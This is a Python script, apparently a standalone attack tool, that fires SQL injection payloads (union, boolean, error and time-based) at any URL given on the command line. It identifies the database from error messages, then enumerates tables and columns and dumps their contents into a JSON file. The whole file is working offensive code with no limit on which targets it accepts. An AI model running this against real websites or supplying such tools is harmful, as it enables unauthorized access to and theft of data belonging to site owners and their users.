import argparse
import requests
import json
import os

REQ_HEADER = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

db_signature = {
    'MySQL': ["You have an error in your SQL syntax"],
    'SQLite': ["near \"\": syntax error"],
    'Oracle': ["ORA-00933: SQL command not properly ended"],
    'Microsoft SQL Server': ["Unclosed quotation mark after the character string"]
}

injection_methods = {
    "union": [
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL FROM information_schema.columns--"
    ],
    "boolean": [
        "' OR '1'='1"
    ],
    "error": [
        "' OR (SELECT 1/0)--"
    ],
    "time": [
        "' AND SLEEP(5)--"
    ]
}

def prepare_injection(url, payload, method):
    if method == "GET":
        injected_url = f'{url}{payload}'
        return injected_url, None
    elif method == "POST":
        data = {url: payload}
        return url, data

def send_http_request(url, data=None, method="GET"):
    headers = REQ_HEADER
    try:
        if method == "GET":
            return requests.get(url, headers=headers, timeout=10)
        elif method == "POST":
            return requests.post(url, data=data, headers=headers, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"HTTP Request failed: {e}")
    return None

def detect_database(response_text):
    for db_name, signatures in db_signature.items():
        for signature in signatures:
            if signature in response_text:
                return db_name
    return "Unknown"

def test_injection(url, method, storage_file):
    results = []

    for method_name, payloads in injection_methods.items():
        for payload in payloads:
            test_url, test_data = prepare_injection(url, payload, method)
            try:
                response = send_http_request(test_url, data=test_data, method=method)
                if response and response.status_code == 200:
                    db_type = detect_database(response.text)
                    if db_type != "Unknown":
                        results.append({
                            "method": method_name,
                            "payload": payload,
                            "database": db_type,
                            "response": response.text[:200]
                        })
            except Exception as e:
                print(f"Error testing payload {payload}: {e}")

    save_results(storage_file, results)
    print_results(results)

def save_results(filename, results):
    if not os.path.exists(filename):
        with open(filename, "w") as f:
            json.dump([], f)

    with open(filename, "r") as f:
        existing_data = json.load(f)

    with open(filename, "w") as f:
        existing_data.extend(results)
        json.dump(existing_data, f, indent=4)

def print_results(results):
    if not results:
        print("No vulnerabilities detected.")
        return

    print("Vulnerabilities detected:")
    for result in results:
        print(f"- Method: {result['method']}, Database: {result['database']}")
        print(f"  Payload: {result['payload']}")

def dump_database_info(url, method, storage_file):
    dump_results = {
        "tables": [],
        "columns": {},
        "data": {}
    }

    table_payload = "' UNION SELECT table_name,NULL FROM information_schema.tables--"
    test_url, test_data = prepare_injection(url, table_payload, method)
    response = send_http_request(test_url, data=test_data, method=method)

    if response and response.status_code == 200:
        dump_results["tables"] = parse_response_data(response.text)

    for table in dump_results["tables"]:
        column_payload = f"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--"
        test_url, test_data = prepare_injection(url, column_payload, method)
        response = send_http_request(test_url, data=test_data, method=method)

        if response and response.status_code == 200:
            dump_results["columns"][table] = parse_response_data(response.text)

    for table, columns in dump_results["columns"].items():
        for column in columns:
            data_payload = f"' UNION SELECT {column},NULL FROM {table}--"
            test_url, test_data = prepare_injection(url, data_payload, method)
            response = send_http_request(test_url, data=test_data, method=method)

            if response and response.status_code == 200:
                if table not in dump_results["data"]:
                    dump_results["data"][table] = {}
                dump_results["data"][table][column] = parse_response_data(response.text)

    with open(storage_file, "r") as f:
        existing_data = json.load(f)

    with open(storage_file, "w") as f:
        existing_data.append({"database_dump": dump_results})
        json.dump(existing_data, f, indent=4)

    print("Database dump saved to", storage_file)

def parse_response_data(response_text):
    return response_text.splitlines()

def parse_arguments():
    parser = argparse.ArgumentParser('Perform blind SQL injection on a URL')
    parser.add_argument('url', type=str, help='URL to test for injection')
    parser.add_argument('-x', type=str, default='GET', help='Request type used (GET/POST)')
    parser.add_argument('-o', type=str, default='data.json', help='Output file for results')
    args = parser.parse_args()
    if args.x not in ('GET', 'POST'):
        parser.error('Unsupported request type')
    return args

def main():
    args = parse_arguments()
    if not os.path.exists(args.o):
        with open(args.o, 'w') as f:
            json.dump([], f)
    test_injection(args.url, args.x, args.o)
    dump_database_info(args.url, args.x, args.o)

if __name__ == '__main__':
    main()